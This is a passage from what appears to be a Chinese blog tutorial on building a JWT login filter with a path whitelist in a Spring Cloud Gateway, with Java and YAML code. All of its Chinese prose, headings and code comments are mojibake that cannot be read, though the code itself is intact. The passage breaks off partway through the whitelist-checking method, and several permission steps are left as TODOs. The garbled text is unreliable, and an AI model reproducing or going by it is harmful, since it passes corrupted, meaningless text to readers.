<p>å¤§éƒ¨åˆ†çš„å¾®æœåŠ¡éƒ½å¿…é¡»åšè¿™æ ·çš„æƒé™åˆ¤æ–­ï¼Œä½†æ˜¯å¦‚æœåœ¨æ¯ä¸ªå¾®æœåŠ¡å•ç‹¬åšæƒé™æ§åˆ¶ï¼Œæ¯ä¸ªå¾®æœåŠ¡ä¸Šçš„æƒé™ä»£ç å°±ä¼šæœ‰é‡å¤ï¼Œå¦‚ä½•æ›´ä¼˜é›…çš„å®Œæˆæƒé™æ§åˆ¶å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨æ•´ä¸ªæœåŠ¡çš„å…¥å£å®ŒæˆæœåŠ¡çš„æƒé™æ§åˆ¶ï¼Œè¿™æ ·å¾®æœåŠ¡ä¸­å°±æ— éœ€å†åšäº†ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022683.png" alt="image-20200330093245307"></p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ç½‘å…³ç¼–å†™è¿‡æ»¤å™¨ï¼Œå¯¹ç”¨æˆ·çš„tokenè¿›è¡Œæ ¡éªŒï¼Œå®Œæˆåˆæ­¥çš„æƒé™åˆ¤æ–­ã€‚</p>
<h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æƒé™æ§åˆ¶ï¼Œä¸€èˆ¬æœ‰ç²—ç²’åº¦ã€ç»†ç²’åº¦æ§åˆ¶ä¹‹åˆ†ï¼Œä½†ä¸ç®¡å“ªç§ï¼Œå‰ææ˜¯ç”¨æˆ·å¿…é¡»å…ˆç™»å½•ã€‚çŸ¥é“è®¿é—®è€…æ˜¯è°ï¼Œæ‰èƒ½çŸ¥é“è¿™ä¸ªäººå…·å¤‡æ€æ ·çš„æƒé™ï¼Œå¯ä»¥è®¿é—®é‚£äº›æœåŠ¡èµ„æºï¼ˆä¹Ÿå°±æ˜¯å¾®æœåŠ¡æ¥å£ï¼‰ã€‚</p>
<p>å› æ­¤ï¼Œæƒé™æ§åˆ¶çš„åŸºæœ¬æµç¨‹æ˜¯è¿™æ ·ï¼š</p>
<ul>
<li>1ï¼‰è·å–ç”¨æˆ·çš„ç™»å½•å‡­è¯jwt</li>
<li>2ï¼‰è§£æjwtï¼Œè·å–ç”¨æˆ·èº«ä»½<ul>
<li>å¦‚æœè§£æå¤±è´¥ï¼Œè¯æ˜æ²¡æœ‰ç™»å½•ï¼Œè¿”å›401</li>
</ul>
</li>
</ul>
<p>&#x2F;&#x2F; TODO</p>
<ul>
<li><em>3ï¼‰æ ¹æ®èº«ä»½ï¼ŒæŸ¥è¯¢ç”¨æˆ·æƒé™ä¿¡æ¯</em></li>
<li><em>4ï¼‰è·å–å½“å‰è¯·æ±‚èµ„æºï¼ˆå¾®æœåŠ¡æ¥å£è·¯å¾„ï¼‰</em></li>
<li><em>5ï¼‰åˆ¤æ–­æ˜¯å¦æœ‰è®¿é—®èµ„æºçš„æƒé™</em></li>
</ul>
<p>ä¸€èˆ¬æƒé™ä¿¡æ¯ä¼šå­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä¼šå¯¹åº”è§’è‰²è¡¨å’Œæƒé™è¡¨ï¼š</p>
<ul>
<li>è§’è‰²ï¼šå°±æ˜¯èº«ä»½ï¼Œä¾‹å¦‚æ™®é€šç”¨æˆ·ï¼Œé‡‘é’»ç”¨æˆ·ï¼Œé»‘é’»ç”¨æˆ·ï¼Œå•†å“ç®¡ç†å‘˜</li>
<li>æƒé™ï¼šå°±æ˜¯å¯è®¿é—®çš„è®¿é—®èµ„æºï¼Œå¦‚æœæ˜¯URLçº§åˆ«çš„æƒé™æ§åˆ¶ï¼ŒåŒ…å«è¯·æ±‚æ–¹å¼ã€è¯·æ±‚è·¯å¾„ã€ç­‰ä¿¡æ¯</li>
</ul>
<p>ä¸€ä¸ªè§’è‰²ä¸€èˆ¬ä¼šæœ‰å¤šä¸ªæƒé™ï¼Œä¸€ä¸ªæƒé™ä¹Ÿå¯ä»¥å±äºå¤šä¸ªç”¨æˆ·ï¼Œå±äºå¤šå¯¹å¤šå…³ç³»ã€‚æ ¹æ®è§’è‰²å¯ä»¥æŸ¥è¯¢åˆ°å¯¹åº”çš„æ‰€æœ‰æƒé™ï¼Œå†æ ¹æ®æƒé™åˆ¤æ–­æ˜¯å¦å¯ä»¥è®¿é—®å½“å‰èµ„æºå³å¯ã€‚</p>
<p>åœ¨æˆ‘ä»¬çš„åŠŸèƒ½ä¸­ï¼Œå› ä¸ºè¿˜æ²¡æœ‰å†™æƒé™åŠŸèƒ½ï¼Œæ‰€ä»¥æš‚æ—¶åªæœ‰ä¸€ä¸ªè§’è‰²ï¼Œå°±æ˜¯æ™®é€šç”¨æˆ·ï¼Œå¯ä»¥è®¿é—®çš„æ˜¯å•†å“åŠåˆ†ç±»å“ç‰Œç­‰çš„æŸ¥è¯¢åŠŸèƒ½ï¼Œä»¥åŠè‡ªå·±çš„ä¿¡æ¯ã€‚ä»¥åç¼–å†™æƒé™æœåŠ¡æ—¶ï¼Œå†è¡¥å……ç›¸å…³ä¸šåŠ¡ã€‚</p>
<h3 id="åŠ è½½å…¬é’¥"><a href="#åŠ è½½å…¬é’¥" class="headerlink" title="åŠ è½½å…¬é’¥"></a>åŠ è½½å…¬é’¥</h3><p>æƒé™æ§åˆ¶çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå°±æ˜¯è·å–cookieï¼Œå¹¶è§£æjwtï¼Œé‚£ä¹ˆè‚¯å®šéœ€è¦å…¬é’¥ã€‚æˆ‘ä»¬åœ¨<code>ly-gateway</code>ä¸­é…ç½®å…¬é’¥ä¿¡æ¯ï¼Œå¹¶åœ¨æœåŠ¡å¯åŠ¨æ—¶åŠ è½½ã€‚</p>
<p>å¦å¤–ï¼Œæ ¡éªŒç”¨æˆ·ç™»å½•è¿˜éœ€è¦å»tokençš„é»‘åå•æ£€æŸ¥ï¼Œéœ€è¦å¼•å…¥redis</p>
<p>é¦–å…ˆå¼•å…¥æ‰€éœ€è¦çš„ä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç¼–å†™å±æ€§æ–‡ä»¶ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">jwt:</span></span><br><span class="line">    <span class="attr">pubKeyPath:</span> <span class="string">C:/develop/ssh/id_rsa.pub</span> <span class="comment"># å…¬é’¥åœ°å€</span></span><br></pre></td></tr></table></figure>

<p>ç¼–å†™å±æ€§ç±»ï¼Œè¯»å–å…¬é’¥ï¼š</p>
<p>å¾—åœ¨å±æ€§æ³¨å…¥ä¹‹ååŠ è½½å…¬é’¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.RsaUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ly.jwt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtProperties</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å…¬é’¥æ–‡ä»¶åœ°å€</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String pubKeyPath;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å…¬é’¥å¯¹è±¡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> PublicKey publicKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.publicKey = RsaUtils.getPublicKey(pubKeyPath);</span><br><span class="line">            log.info(<span class="string">&quot;ã€ç½‘å…³ã€‘åŠ è½½å…¬é’¥æˆåŠŸï¼&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;ã€ç½‘å…³ã€‘åˆå§‹åŒ–å…¬é’¥å¤±è´¥ï¼&quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="ç¼–å†™è¿‡æ»¤å™¨é€»è¾‘"><a href="#ç¼–å†™è¿‡æ»¤å™¨é€»è¾‘" class="headerlink" title="ç¼–å†™è¿‡æ»¤å™¨é€»è¾‘"></a>ç¼–å†™è¿‡æ»¤å™¨é€»è¾‘</h3><p>æœ‰äº†å…¬é’¥ï¼Œå°±å¯ä»¥ç¼–å†™æƒé™æ§åˆ¶é€»è¾‘äº†ï¼Œæƒé™éªŒè¯é€šè¿‡ï¼Œæ”¾è¡Œåˆ°å¾®æœåŠ¡ï¼›ä¸é€šè¿‡ï¼Œåˆ™æ‹¦æˆªå¹¶è¿”å›401ç»™ç”¨æˆ·ã€‚å› æ­¤æ‹¦æˆªçš„é€»è¾‘éœ€è¦åœ¨è¯·æ±‚è¢«è·¯ç”±ä¹‹å‰æ‰§è¡Œï¼Œä½ èƒ½æƒ³åˆ°ç”¨ä»€ä¹ˆå®ç°å—ï¼Ÿ</p>
<p>æ²¡é”™ï¼Œå°±æ˜¯Gatewayä¸­çš„GlobalFilterã€‚</p>
<p>åŸºæœ¬é€»è¾‘ï¼š</p>
<ul>
<li>è·å–cookieä¸­çš„token</li>
<li>é€šè¿‡JWTå¯¹tokenè¿›è¡Œè§£æ<ul>
<li>è§£æé€šè¿‡ï¼Œç»§ç»­æƒé™æ ¡éªŒ</li>
<li>è§£æä¸é€šè¿‡ï¼Œè¿”å›401</li>
</ul>
</li>
<li>TODO æ ¹æ®ç”¨æˆ·èº«ä»½è·å–æƒé™ä¿¡æ¯</li>
<li>TODO è·å–å½“å‰è¯·æ±‚è·¯å¾„ï¼Œåˆ¤æ–­æƒé™</li>
<li>TODO é€šè¿‡ï¼šåˆ™æ”¾è¡Œï¼›ä¸é€šè¿‡ï¼šåˆ™è¿”å›401</li>
</ul>
<p>æˆ‘ä»¬åœ¨<code>ly-gateway</code>çš„<code>com.leyou.gateway.filters</code>åŒ…ä¸‹æ·»åŠ ä¸€ä¸ªè¿‡æ»¤å™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exceptions.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.è·å–Requestå¯¹è±¡</span></span><br><span class="line">            <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">            <span class="comment">// 2.è·å–cookie</span></span><br><span class="line">            <span class="type">HttpCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> request.getCookies().getFirst(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">            <span class="keyword">if</span>(cookie == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;æœªç™»å½•æˆ–çŠ¶æ€æ— æ•ˆï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.æ ¡éªŒtokenæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// TODO æƒé™åˆ¤æ–­</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                <span class="comment">// è§£æå¤±è´¥ï¼Œtokenæœ‰è¯¯</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;æœªç™»å½•æˆ–çŠ¶æ€æ— æ•ˆï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.æœ‰æ•ˆï¼Œæ”¾è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LyException e) &#123;</span><br><span class="line">            <span class="comment">// 5.æ— æ•ˆï¼ŒçŠ¶æ€ç ä¸º401ï¼Œæœªæˆæƒ</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="comment">// æ‹¦æˆªè¯·æ±‚</span></span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ç™»å½•æ‹¦æˆªï¼Œå¯ä»¥é‡‡ç”¨æœ€é«˜ä¼˜å…ˆçº§ï¼</span></span><br><span class="line">        <span class="keyword">return</span> HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h3><p>æ­¤æ—¶æˆ‘ä»¬å°è¯•å†æ¬¡ç™»å½•ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022684.png" alt="image-20200322233028428"> </p>
<p>ç™»å½•æ¥å£ä¹Ÿè¢«æ‹¦æˆªå™¨æ‹¦æˆªäº†ï¼ï¼ï¼</p>
<p>è¦æ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è·¯å¾„æˆ‘ä»¬éƒ½éœ€è¦æ‹¦æˆªï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><p>ç™»å½•æ ¡éªŒæ¥å£ï¼š<code>/auth/user/login</code></p>
</li>
<li><p>æ³¨å†Œæ¥å£ï¼š<code>/user/info/register</code></p>
<p>æ•°æ®æ ¡éªŒæ¥å£ï¼š<code>/user/info/exists/</code></p>
</li>
<li><p>å‘é€éªŒè¯ç æ¥å£ï¼š<code>/user/info/code</code></p>
</li>
<li><p>æœç´¢æ¥å£ï¼š<code>/search/**</code></p>
</li>
</ul>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ‹¦æˆªæ—¶ï¼Œé…ç½®ä¸€ä¸ªç™½åå•ï¼Œå¦‚æœåœ¨åå•å†…ï¼Œåˆ™ä¸è¿›è¡Œæ‹¦æˆªã€‚</p>
<p>åœ¨<code>ly-gateway</code>çš„<code>application.yaml</code>ä¸­æ·»åŠ è§„åˆ™ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">filter:</span></span><br><span class="line">    <span class="attr">allowRequests:</span></span><br><span class="line">      <span class="string">&quot;[/auth/user/login]&quot;</span><span class="string">:</span> </span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;POST&quot;</span> <span class="comment"># ç™»å½•</span></span><br><span class="line">      <span class="string">&quot;[/auth/user/verify]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;GET&quot;</span> <span class="comment"># é¦–é¡µç™»å½•æ ¡éªŒ</span></span><br><span class="line">      <span class="string">&quot;[/search/goods]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;POST&quot;</span> <span class="comment"># æœç´¢</span></span><br><span class="line">      <span class="string">&quot;[/user/info/exists]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;GET&quot;</span> <span class="comment"># æ ¡éªŒç”¨æˆ·æ•°æ®æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">      <span class="string">&quot;[/user/info]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;POST&quot;</span> <span class="comment">#  </span></span><br><span class="line">      <span class="string">&quot;[/item]&quot;</span><span class="string">:</span></span><br><span class="line">      	<span class="bullet">-</span> <span class="string">&quot;GET&quot;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>ly-gateway</code>çš„<code>com.leyou.gateway.config</code>åŒ…ä¸­å®šä¹‰ç±»<code>FilterProperties</code>ï¼Œè¯»å–è¿™äº›å±æ€§ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(&quot;ly.filter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterProperties</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Set&lt;String&gt;&gt; allowRequests;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ç„¶åä¿®æ”¹è¿‡æ»¤å™¨<code>LoginUserFilter</code>çš„ä»£ç ï¼Œç”¨æˆ·ç™»å½•ä¿¡æ¯<strong>æ ¡éªŒå¤±è´¥ä»¥å</strong>ï¼Œåˆ¤æ–­ç”¨æˆ·è·¯å¾„æ˜¯å¦æ˜¯ç™½åå•ä¸­çš„è·¯å¾„ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œï¼Œå¦‚æœä¸æ˜¯åˆ™æ‹¦æˆªã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exceptions.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.FilterProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FilterProperties filterProp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp, FilterProperties filterProp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">        <span class="built_in">this</span>.filterProp = filterProp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.è·å–Requestå¯¹è±¡</span></span><br><span class="line">            <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">            <span class="comment">// 2.è·å–cookie</span></span><br><span class="line">            <span class="type">HttpCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> request.getCookies().getFirst(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">            <span class="keyword">if</span>(cookie == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;æœªç™»å½•æˆ–çŠ¶æ€æ— æ•ˆï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.æ ¡éªŒtokenæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookie.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// TODO æƒé™åˆ¤æ–­</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                <span class="comment">// è§£æå¤±è´¥ï¼Œtokenæœ‰è¯¯</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;æœªç™»å½•æˆ–çŠ¶æ€æ— æ•ˆï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.æœ‰æ•ˆï¼Œæ”¾è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LyException e) &#123;</span><br><span class="line">            <span class="comment">// 5.ç™»å½•æ— æ•ˆï¼Œåˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœåœ¨ä¹Ÿè¦æ”¾è¡Œ</span></span><br><span class="line">            <span class="keyword">if</span>(isAllowRequest(exchange))&#123;</span><br><span class="line">                <span class="comment">// åœ¨ç™½åå•è®¸å¯ä¸­ï¼Œæ”¾è¡Œ</span></span><br><span class="line">                <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// çŠ¶æ€ç ä¸º401ï¼Œæœªæˆæƒ</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="comment">// æ‹¦æˆªè¯·æ±‚</span></span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAllowRequest</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–å½“å‰è¯·æ±‚Request</span></span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="comment">// 2.è·å–è¯·æ±‚æ–¹å¼å’Œè¯·æ±‚è·¯å¾„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethodValue();<span class="comment">// æ–¹å¼ï¼šGET</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPath().toString(); <span class="comment">// è·¯å¾„ï¼š /item/brand/2032</span></span><br><span class="line">        <span class="comment">// 3.éå†ç™½åå•</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Set&lt;String&gt;&gt; entry : filterProp.getAllowRequests().entrySet()) &#123;</span><br><span class="line">            <span class="comment">// ç™½åå•è·¯å¾„å‰ç¼€</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">allowPathPrefix</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="comment">// 